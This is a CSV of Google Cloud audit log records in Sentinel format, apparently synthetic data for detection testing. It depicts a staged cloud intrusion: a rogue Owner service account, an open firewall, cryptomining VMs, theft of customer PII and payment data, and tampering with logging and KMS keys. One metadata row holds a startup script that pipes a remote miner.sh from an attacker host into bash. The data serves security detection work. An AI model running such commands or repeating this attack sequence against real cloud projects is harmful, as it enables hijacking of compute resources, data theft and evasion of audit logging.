TimeGenerated,Timestamp,LogName,ServiceName,MethodName,GCPResourceName,GCPResourceType,ProjectId,PrincipalEmail,AuthenticationInfo,AuthorizationInfo,Request,Response,RequestMetadata,ResourceLocation,ResourceOriginalState,Metadata,ServiceData,Status,StatusMessage,NumResponseItems,InsertId,Severity,Subscription,SourceSystem,TenantId,Type
2025-12-15T07:30:00Z,2025-12-15T07:30:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,iam.googleapis.com,google.iam.admin.v1.CreateServiceAccount,projects/contoso-prod-01/serviceAccounts/[email],iam_service_account,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""iam.serviceAccounts.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01""}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.CreateServiceAccountRequest"", ""name"": ""projects/contoso-prod-01"", ""accountId"": ""exfil-sa"", ""serviceAccount"": {""displayName"": ""Data Export Service""}}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.ServiceAccount"", ""name"": ""projects/contoso-prod-01/serviceAccounts/[email]"", ""email"": ""[email]"", ""uniqueId"": ""112233445566778899""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-abc123def456,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T07:31:15Z,2025-12-15T07:31:15Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,iam.googleapis.com,google.iam.admin.v1.CreateServiceAccountKey,projects/contoso-prod-01/serviceAccounts/[email]/keys/aabbccdd1122,iam_service_account_key,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""iam.serviceAccountKeys.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/serviceAccounts/[email]""}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.CreateServiceAccountKeyRequest"", ""name"": ""projects/contoso-prod-01/serviceAccounts/[email]"", ""privateKeyType"": ""TYPE_GOOGLE_CREDENTIALS_FILE"", ""keyAlgorithm"": ""KEY_ALG_RSA_2048""}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.ServiceAccountKey"", ""name"": ""projects/contoso-prod-01/serviceAccounts/[email]/keys/aabbccdd1122"", ""validAfterTime"": ""2025-12-15T07:31:15Z"", ""validBeforeTime"": ""2027-12-15T07:31:15Z"", ""keyAlgorithm"": ""KEY_ALG_RSA_2048""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-bcd234efg567,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T07:32:45Z,2025-12-15T07:32:45Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,cloudresourcemanager.googleapis.com,SetIamPolicy,projects/contoso-prod-01,project,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""resourcemanager.projects.setIamPolicy"", ""granted"": true, ""resource"": ""projects/contoso-prod-01""}","{""@type"": ""type.googleapis.com/google.iam.v1.SetIamPolicyRequest"", ""policy"": {""bindings"": [{""role"": ""roles/owner"", ""members"": [""serviceAccount:[email]""]}]}, ""updateMask"": ""bindings""}","{""@type"": ""type.googleapis.com/google.iam.v1.Policy"", ""bindings"": [{""role"": ""roles/owner"", ""members"": [""serviceAccount:[email]"", ""user:[email]""]}]}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-cde345fgh678,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T08:00:22Z,2025-12-15T08:00:22Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.firewalls.insert,projects/contoso-prod-01/global/firewalls/allow-all-ingress,gce_firewall_rule,contoso-prod-01,[email],"{""principalEmail"": ""[email]"", ""serviceAccountKeyName"": ""//iam.googleapis.com/projects/contoso-prod-01/serviceAccounts/[email]/keys/aabbccdd1122""}","{""permission"": ""compute.firewalls.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/global/firewalls/allow-all-ingress""}","{""@type"": ""type.googleapis.com/compute.firewalls.insert"", ""name"": ""allow-all-ingress"", ""direction"": ""INGRESS"", ""allowed"": [{""IPProtocol"": ""tcp"", ""ports"": [""0-65535""]}], ""sourceRanges"": [""0.0.0.0/0""], ""network"": ""projects/contoso-prod-01/global/networks/default"", ""priority"": 100}","{""@type"": ""type.googleapis.com/operation"", ""id"": ""op-fw-insert-001"", ""name"": ""operation-fw-insert-001"", ""status"": ""DONE""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-def456ghi789,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T08:05:10Z,2025-12-15T08:05:10Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.instances.insert,projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01,gce_instance,contoso-prod-01,[email],"{""principalEmail"": ""[email]"", ""serviceAccountKeyName"": ""//iam.googleapis.com/projects/contoso-prod-01/serviceAccounts/[email]/keys/aabbccdd1122""}","{""permission"": ""compute.instances.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01""}","{""@type"": ""type.googleapis.com/compute.instances.insert"", ""name"": ""crypto-worker-01"", ""machineType"": ""projects/contoso-prod-01/zones/us-central1-a/machineTypes/n2-highcpu-96"", ""disks"": [{""initializeParams"": {""sourceImage"": ""projects/ubuntu-os-cloud/global/images/ubuntu-2204-jammy-v20251201""}}], ""networkInterfaces"": [{""network"": ""projects/contoso-prod-01/global/networks/default"", ""accessConfigs"": [{""type"": ""ONE_TO_ONE_NAT"", ""name"": ""External NAT""}]}]}","{""@type"": ""type.googleapis.com/operation"", ""id"": ""op-inst-insert-001"", ""name"": ""operation-inst-insert-001"", ""status"": ""DONE""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1-a""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-efg567hij890,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T08:05:55Z,2025-12-15T08:05:55Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.instances.insert,projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-02,gce_instance,contoso-prod-01,[email],"{""principalEmail"": ""[email]"", ""serviceAccountKeyName"": ""//iam.googleapis.com/projects/contoso-prod-01/serviceAccounts/[email]/keys/aabbccdd1122""}","{""permission"": ""compute.instances.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-02""}","{""@type"": ""type.googleapis.com/compute.instances.insert"", ""name"": ""crypto-worker-02"", ""machineType"": ""projects/contoso-prod-01/zones/us-central1-a/machineTypes/n2-highcpu-96"", ""disks"": [{""initializeParams"": {""sourceImage"": ""projects/ubuntu-os-cloud/global/images/ubuntu-2204-jammy-v20251201""}}], ""networkInterfaces"": [{""network"": ""projects/contoso-prod-01/global/networks/default"", ""accessConfigs"": [{""type"": ""ONE_TO_ONE_NAT"", ""name"": ""External NAT""}]}]}","{""@type"": ""type.googleapis.com/operation"", ""id"": ""op-inst-insert-002"", ""name"": ""operation-inst-insert-002"", ""status"": ""DONE""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1-a""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-fgh678ijk901,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T08:15:00Z,2025-12-15T08:15:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.instances.setMetadata,projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01,gce_instance,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""compute.instances.setMetadata"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01""}","{""@type"": ""type.googleapis.com/compute.instances.setMetadata"", ""metadata"": {""items"": [{""key"": ""startup-script"", ""value"": ""#!/bin/bash\ncurl -s http://203.0.113.50:8080/miner.sh | bash""}]}}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1-a""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-ghi789jkl012,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:00:33Z,2025-12-15T09:00:33Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Fdata_access,storage.googleapis.com,storage.objects.list,projects/_/buckets/contoso-customer-data,gcs_bucket,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""storage.objects.list"", ""granted"": true, ""resource"": ""projects/_/buckets/contoso-customer-data""}","{""@type"": ""type.googleapis.com/storage.objects.list"", ""bucket"": ""contoso-customer-data""}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,847,ins-hij890klm123,INFO,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:02:15Z,2025-12-15T09:02:15Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Fdata_access,storage.googleapis.com,storage.objects.get,projects/_/buckets/contoso-customer-data/objects/exports/customer-pii-2025.csv,gcs_bucket,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""storage.objects.get"", ""granted"": true, ""resource"": ""projects/_/buckets/contoso-customer-data/objects/exports/customer-pii-2025.csv""}","{""@type"": ""type.googleapis.com/storage.objects.get"", ""bucket"": ""contoso-customer-data"", ""object"": ""exports/customer-pii-2025.csv""}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-ijk901lmn234,INFO,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:02:48Z,2025-12-15T09:02:48Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Fdata_access,storage.googleapis.com,storage.objects.get,projects/_/buckets/contoso-customer-data/objects/exports/payment-records-2025.csv,gcs_bucket,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""storage.objects.get"", ""granted"": true, ""resource"": ""projects/_/buckets/contoso-customer-data/objects/exports/payment-records-2025.csv""}","{""@type"": ""type.googleapis.com/storage.objects.get"", ""bucket"": ""contoso-customer-data"", ""object"": ""exports/payment-records-2025.csv""}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-jkl012mno345,INFO,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:10:00Z,2025-12-15T09:10:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,storage.googleapis.com,storage.setIamPermissions,projects/_/buckets/contoso-customer-data,gcs_bucket,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""storage.buckets.setIamPolicy"", ""granted"": true, ""resource"": ""projects/_/buckets/contoso-customer-data""}","{""@type"": ""type.googleapis.com/storage.setIamPermissions"", ""bindings"": [{""role"": ""roles/storage.objectViewer"", ""members"": [""allUsers""]}]}","{""@type"": ""type.googleapis.com/google.iam.v1.Policy"", ""bindings"": [{""role"": ""roles/storage.objectViewer"", ""members"": [""allUsers""]}]}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-klm123nop456,ERROR,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:30:00Z,2025-12-15T09:30:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,logging.googleapis.com,google.logging.v2.ConfigServiceV2.DeleteSink,projects/contoso-prod-01/sinks/sentinel-export-sink,logging_sink,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""logging.sinks.delete"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/sinks/sentinel-export-sink""}","{""@type"": ""type.googleapis.com/google.logging.v2.DeleteSinkRequest"", ""sinkName"": ""projects/contoso-prod-01/sinks/sentinel-export-sink""}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-lmn234opq567,ERROR,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T09:35:22Z,2025-12-15T09:35:22Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,logging.googleapis.com,google.logging.v2.ConfigServiceV2.UpdateSink,projects/contoso-prod-01/sinks/audit-logs-sink,logging_sink,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""logging.sinks.update"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/sinks/audit-logs-sink""}","{""@type"": ""type.googleapis.com/google.logging.v2.UpdateSinkRequest"", ""sinkName"": ""projects/contoso-prod-01/sinks/audit-logs-sink"", ""sink"": {""name"": ""audit-logs-sink"", ""filter"": ""severity >= ERROR"", ""destination"": ""storage.googleapis.com/contoso-audit-archive""}}","{""@type"": ""type.googleapis.com/google.logging.v2.LogSink"", ""name"": ""audit-logs-sink"", ""filter"": ""severity >= ERROR""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}","{""@type"": ""type.googleapis.com/google.logging.v2.LogSink"", ""name"": ""audit-logs-sink"", ""filter"": """", ""destination"": ""storage.googleapis.com/contoso-audit-archive""}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-mno345pqr678,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T10:00:00Z,2025-12-15T10:00:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Fdata_access,bigquery.googleapis.com,google.cloud.bigquery.v2.JobService.InsertJob,projects/contoso-prod-01/jobs/bqjob_export_pii_001,bigquery_project,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""bigquery.jobs.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01""}","{""@type"": ""type.googleapis.com/google.cloud.bigquery.v2.Job"", ""jobConfiguration"": {""query"": {""query"": ""SELECT * FROM contoso-prod-01.customer_db.users WHERE payment_info IS NOT NULL"", ""destinationTable"": {""projectId"": ""contoso-prod-01"", ""datasetId"": ""temp_exports"", ""tableId"": ""user_payment_dump""}}}}","{""jobCompletedEvent"": {""job"": {""jobStatus"": {""state"": ""DONE""}, ""jobStatistics"": {""totalBilledBytes"": ""10737418240"", ""totalProcessedBytes"": ""10737418240""}}}}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""US""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-nop456qrs789,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T10:15:30Z,2025-12-15T10:15:30Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Fdata_access,bigquery.googleapis.com,google.cloud.bigquery.v2.TableDataService.ExportTable,projects/contoso-prod-01/datasets/temp_exports/tables/user_payment_dump,bigquery_project,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""bigquery.tables.export"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/datasets/temp_exports/tables/user_payment_dump""}","{""@type"": ""type.googleapis.com/google.cloud.bigquery.v2.Job"", ""jobConfiguration"": {""extract"": {""sourceTable"": {""projectId"": ""contoso-prod-01"", ""datasetId"": ""temp_exports"", ""tableId"": ""user_payment_dump""}, ""destinationUri"": ""gs://contoso-customer-data/exports/user_payment_dump_*.csv""}}}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""US""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-opq567rst890,WARNING,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T11:00:00Z,2025-12-15T11:00:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,sqladmin.googleapis.com,cloudsql.instances.update,projects/contoso-prod-01/instances/prod-sql-01,cloudsql_database,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""cloudsql.instances.update"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/instances/prod-sql-01""}","{""@type"": ""type.googleapis.com/sqladmin.instances.update"", ""databaseInstance"": {""settings"": {""ipConfiguration"": {""authorizedNetworks"": [{""value"": ""0.0.0.0/0"", ""name"": ""allow-all""}]}}}}","{""@type"": ""type.googleapis.com/sqladmin.instances.update"", ""databaseInstance"": {""settings"": {""ipConfiguration"": {""authorizedNetworks"": [{""value"": ""0.0.0.0/0"", ""name"": ""allow-all""}]}}}}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""us-central1""]}","{""databaseInstance"": {""settings"": {""ipConfiguration"": {""authorizedNetworks"": [{""value"": ""10.0.0.0/8"", ""name"": ""internal-only""}]}}}}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-pqr678stu901,ERROR,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T11:30:00Z,2025-12-15T11:30:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,container.googleapis.com,io.k8s.core.v1.pods.create,projects/contoso-prod-01/locations/us-central1/clusters/prod-gke-01/k8s/namespaces/kube-system/pods/priv-pod-001,k8s_cluster,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""io.k8s.core.v1.pods.create"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/locations/us-central1/clusters/prod-gke-01""}","{""@type"": ""type.googleapis.com/io.k8s.core.v1.Pod"", ""metadata"": {""name"": ""priv-pod-001"", ""namespace"": ""kube-system""}, ""spec"": {""containers"": [{""name"": ""shell"", ""image"": ""ubuntu:latest"", ""command"": [""/bin/bash""], ""securityContext"": {""privileged"": true}}], ""hostNetwork"": true, ""hostPID"": true}}","","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""kubectl/v1.28.0""}","{""currentLocations"": [""us-central1""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-qrs789tuv012,ERROR,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T12:00:00Z,2025-12-15T12:00:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,cloudkms.googleapis.com,DestroyCryptoKeyVersion,projects/contoso-prod-01/locations/global/keyRings/prod-keyring/cryptoKeys/data-encryption-key/cryptoKeyVersions/1,cloudkms_cryptokey,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""cloudkms.cryptoKeyVersions.destroy"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/locations/global/keyRings/prod-keyring/cryptoKeys/data-encryption-key/cryptoKeyVersions/1""}","{""@type"": ""type.googleapis.com/google.cloud.kms.v1.DestroyCryptoKeyVersionRequest"", ""name"": ""projects/contoso-prod-01/locations/global/keyRings/prod-keyring/cryptoKeys/data-encryption-key/cryptoKeyVersions/1""}","{""@type"": ""type.googleapis.com/google.cloud.kms.v1.CryptoKeyVersion"", ""name"": ""projects/contoso-prod-01/locations/global/keyRings/prod-keyring/cryptoKeys/data-encryption-key/cryptoKeyVersions/1"", ""state"": ""DESTROY_SCHEDULED"", ""destroyTime"": ""2025-12-16T12:00:00Z""}","{""callerIp"": ""203.0.113.50"", ""callerSuppliedUserAgent"": ""google-cloud-sdk/450.0.0 gcloud/450.0.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-rst890uvw123,ERROR,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T13:00:00Z,2025-12-15T13:00:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,iam.googleapis.com,google.iam.admin.v1.DeleteServiceAccount,projects/contoso-prod-01/serviceAccounts/[email],iam_service_account,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""iam.serviceAccounts.delete"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/serviceAccounts/[email]""}","{""@type"": ""type.googleapis.com/google.iam.admin.v1.DeleteServiceAccountRequest"", ""name"": ""projects/contoso-prod-01/serviceAccounts/[email]""}","","{""callerIp"": ""198.51.100.23"", ""callerSuppliedUserAgent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-stu901vwx234,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T13:05:00Z,2025-12-15T13:05:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.firewalls.delete,projects/contoso-prod-01/global/firewalls/allow-all-ingress,gce_firewall_rule,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""compute.firewalls.delete"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/global/firewalls/allow-all-ingress""}","{""@type"": ""type.googleapis.com/compute.firewalls.delete"", ""firewall"": ""allow-all-ingress""}","{""@type"": ""type.googleapis.com/operation"", ""status"": ""DONE""}","{""callerIp"": ""198.51.100.23"", ""callerSuppliedUserAgent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0""}","{""currentLocations"": [""global""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-tuv012wxy345,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T13:10:00Z,2025-12-15T13:10:00Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.instances.delete,projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01,gce_instance,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""compute.instances.delete"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-01""}","{""@type"": ""type.googleapis.com/compute.instances.delete"", ""instance"": ""crypto-worker-01""}","{""@type"": ""type.googleapis.com/operation"", ""status"": ""DONE""}","{""callerIp"": ""198.51.100.23"", ""callerSuppliedUserAgent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0""}","{""currentLocations"": [""us-central1-a""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-uvw123xyz456,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
2025-12-15T13:10:30Z,2025-12-15T13:10:30Z,projects/contoso-prod-01/logs/cloudaudit.googleapis.com%2Factivity,compute.googleapis.com,v1.compute.instances.delete,projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-02,gce_instance,contoso-prod-01,[email],"{""principalEmail"": ""[email]""}","{""permission"": ""compute.instances.delete"", ""granted"": true, ""resource"": ""projects/contoso-prod-01/zones/us-central1-a/instances/crypto-worker-02""}","{""@type"": ""type.googleapis.com/compute.instances.delete"", ""instance"": ""crypto-worker-02""}","{""@type"": ""type.googleapis.com/operation"", ""status"": ""DONE""}","{""callerIp"": ""198.51.100.23"", ""callerSuppliedUserAgent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0""}","{""currentLocations"": [""us-central1-a""]}",,,"{""code"": 0, ""message"": ""OK""}",OK,,ins-vwx234yza567,NOTICE,projects/contoso-prod-01/subscriptions/sentinel-sub,GCP,8ecf8077-cf51-4820-aadd-14040956f35d,GCPAuditLogs
